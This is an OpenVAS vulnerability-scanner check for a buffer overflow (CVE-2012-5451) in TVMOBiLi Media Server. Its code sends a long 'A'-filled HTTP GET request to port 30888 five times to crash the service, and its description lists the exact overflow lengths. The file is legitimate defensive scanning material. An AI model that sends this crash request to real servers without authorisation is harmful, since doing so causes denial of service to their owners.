###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tvmobili_media_server_mult_bof_vuln.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# TVMOBiLi Media Server HTTP Request Multiple BOF Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803125");
  script_version("$Revision: 11857 $");
  script_cve_id("CVE-2012-5451");
  script_bugtraq_id(56853);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 10:25:16 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-12-10 10:36:49 +0530 (Mon, 10 Dec 2012)");
  script_name("TVMOBiLi Media Server HTTP Request Multiple BOF Vulnerabilities");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_tag(name:"solution_type", value:"VendorFix");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 30888);
  script_mandatory_keys("TVMOBiLi/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute the
  arbitrary code or cause a DoS (Denial of Service) and potentially
  compromise a vulnerable system.");
  script_tag(name:"affected", value:"TVMOBiLi Media Server version 2.1.0.3557 and prior");
  script_tag(name:"insight", value:"Improper handling of URI length within the 'HttpUtils.dll' dynamic-link
  library. A remote attacker can send a specially crafted HTTP GET request
  of 161, 257, 255  or HTTP HEAD request of 255, 257 or 260 characters long
  to 30888/TCP port and cause a stack-based buffer overrun that will crash
  tvMobiliService service.");
  script_tag(name:"solution", value:"Update to TVMOBiLi Media Server 2.1.3974 or later.");
  script_tag(name:"summary", value:"This host is running TVMOBiLi Media Server and is prone to multiple
  buffer overflow vulnerabilities.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51465/");
  script_xref(name:"URL", value:"http://dev.tvmobili.com/changelog.php");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2012/Dec/54");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/23254/");
  script_xref(name:"URL", value:"http://forum.tvmobili.com/viewtopic.php?f=7&t=55117");

  script_xref(name:"URL", value:"http://www.tvmobili.com/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:30888);
banner = get_http_banner(port:port);
if("Server: " >!< banner && "TVMOBiLi UPnP Server/" >!< banner){
  exit(0);
}

req = http_get(item:string("/__index"), port:port);
res = http_keepalive_send_recv(port:port, data:req);

if('>TVMOBiLi' >!< res && 'TVMOBiLi LTD' >!< res){
  exit(0);
}

req = http_get(item:string("/", crap(data: "A", length: 257)), port:port);

## Send the attack request multiple time
for(i=0; i<5; i++){
  res = http_send_recv(port:port, data:req);
}

banner = get_http_banner(port:port);

if(!banner && "TVMOBiLi UPnP Server/" >!< banner)
{
  security_message(port);
  exit(0);
}

## Some time even application crashed
## It  responds and gives banner.
## So cross check with the content of the page
req = http_get(item:string("/__index"), port:port);
res = http_send_recv(port:port, data:req);

## if did not get anything from the server report the warning
if(!res &&  '>TVMOBiLi' >!< res && 'TVMOBiLi LTD' >!< res){
  security_message(port:port);
  exit(0);
}

exit(99);
